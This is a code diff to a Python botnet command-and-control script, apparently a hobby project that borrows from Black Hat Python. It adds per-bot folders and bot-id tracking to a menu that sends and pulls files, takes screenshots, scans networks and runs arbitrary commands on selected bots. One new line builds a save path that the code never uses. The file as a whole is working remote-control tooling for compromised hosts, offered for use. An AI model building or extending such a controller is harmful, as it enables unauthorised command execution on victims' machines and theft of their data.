@@ -11,6 +11,8 @@ bind_port = 9990
 send_host = '127.0.0.1'
 send_port = 6660
 
+cur_bot_id = -1
+
 # ---------- TCP Server ---------- #
 # Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
 # TCP server to accept messages from bot, runs as a thread
@@ -72,7 +74,7 @@ def view_bots():
         print('')
 
 
-def set_bot(bot_id):
+def set_bot_ip(bot_id):
     # Sets which bot to send to
 
     # Open the XML, get the elements, assign the desired bot
@@ -82,6 +84,15 @@ def set_bot(bot_id):
 
     # Return/set he IP address of the bot
     return bot.attributes['ip'].value
+
+
+def set_bot_id(bot_id):
+    bot_list = minidom.parse('bots.xml')
+    bots = bot_list.getElementsByTagName('bot')
+    bot = bots[int(bot_id)]
+
+    # Return/set he IP address of the bot
+    return bot.attributes['id'].value
 
 
 def add_bot(client):
@@ -97,10 +108,11 @@ def add_bot(client):
     # Open the file as XML, and get all the bots that exist
     bot_list = minidom.parse('bots.xml')
     bots = bot_list.getElementsByTagName('bot')
+    new_id = str(len(bots))
 
     # Create a new bot and set it's attributes. Currently static
     new_bot = bot_list.createElement('bot')
-    new_bot.setAttribute('id', str(len(bots)))
+    new_bot.setAttribute('id', new_id)
     new_bot.setAttribute('ip', ip)
     new_bot.setAttribute('mac', mac)
     new_bot.setAttribute('os', os)
@@ -109,6 +121,10 @@ def add_bot(client):
     my_file = open('bots.xml', 'w')
     my_file.write(bot_list.toxml())
     my_file.close()
+
+    path = '%s\\bot%s' % (os.path.dirname(os.path.abspath(__file__)), new_id)
+    if not os.path.exists(path):
+        os.makedirs(path)
 
     print('[*--> Bot was added')
     print('>>> \n')
@@ -211,6 +227,7 @@ def get_file(the_file):
     if client.recv(1024) == '[*-->ok':
         client.send('[*-->start')
         print ("Receiving...")
+        path = '%s\\bot%s\\%s' % (os.path.dirname(os.path.realpath(__file__)), cur_bot_id, the_file)
         recv_file = open(the_file, 'wb')
         file_stream = client.recv(1024)
 
@@ -314,26 +331,36 @@ while True:
         show_files()
 
     elif select == 2:  # Send File
-        send_host = (set_bot(raw_input('pick a bot')))
+        bot_selection = raw_input('pick a bot')
+        send_host = set_bot_ip(bot_selection)
+        cur_bot_id = bot_selection
         file_to_send = raw_input('The File >>> \n')
         send_file(file_to_send)
 
     elif select == 3:  # Get File
-        send_host = (set_bot(raw_input('pick a bot')))
+        bot_selection = raw_input('pick a bot')
+        send_host = set_bot_ip(bot_selection)
+        cur_bot_id = bot_selection
         file_to_get = raw_input('The File >>> \n')
         get_file(file_to_get)
 
     elif select == 4:  # Tell bot to Screen Shot
-        send_host = (set_bot(raw_input('pick a bot')))
+        bot_selection = raw_input('pick a bot')
+        send_host = set_bot_ip(bot_selection)
+        cur_bot_id = bot_selection
         take_ss()
 
     elif select == 5:  # Tell bot to Scan network
-        send_host = (set_bot(raw_input('pick a bot')))
+        bot_selection = raw_input('pick a bot')
+        send_host = set_bot_ip(bot_selection)
+        cur_bot_id = bot_selection
         ip_to_scan = raw_input('Enter a IP + CIDR (ex.: 192.168.1.0/24) >>> \n')
         do_scan(ip_to_scan)
 
     elif select == 6:  # Tell bot to run a command
-        send_host = (set_bot(raw_input('pick a bot')))
+        bot_selection = raw_input('pick a bot')
+        send_host = set_bot_ip(bot_selection)
+        cur_bot_id = bot_selection
         cmd_to_run = raw_input('The CMD >>> \n')
         send_cmd(cmd_to_run)
 
